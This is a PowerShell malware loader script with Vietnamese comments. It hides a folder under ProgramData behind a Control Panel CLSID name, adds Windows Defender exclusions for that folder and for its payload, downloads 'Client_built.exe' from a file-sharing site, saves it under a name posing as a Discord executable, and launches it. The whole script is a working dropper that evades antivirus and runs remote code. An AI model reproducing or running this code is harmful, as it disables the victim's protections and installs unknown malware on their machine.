$AppId = "haideptraii"
$mutexName = "Global\$AppId"
$CreatedNew = $false

try {
    # Kiểm tra xem Mutex đã tồn tại chưa
    $mutex = [System.Threading.Mutex]::OpenExisting($mutexName)
    Write-Host "[!] An instance of this script is already running."
    Stop-Process -Id $PID -Force
} catch {
    # Nếu Mutex chưa tồn tại, tạo mới
    $mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$CreatedNew)
}

# Nếu không tạo được Mutex mới, thoát script
if (-not $CreatedNew) {
    Write-Host "[!] Another instance is already running."
    Stop-Process -Id $PID -Force
}

$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

$uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
$hash = [System.BitConverter]::ToString($md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($uuid)))
$uuid = $hash -replace "-",""

$url = "https://anonsharing.com/file/86625d0a54106c6f/Client_built.exe"
$output = "$dir\$uuid_discordv3.exe"
Add-MpPreference -ExclusionPath $output

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
    Write-Host "Tệp đã được tải về thành công."
}
$processExists = tasklist | Select-String -Pattern ([System.IO.Path]::GetFileName($output))

if ($processExists) {
    Write-Host "Process $output đang chạy, không khởi động lại."
} else {
    Start-Process $output
}
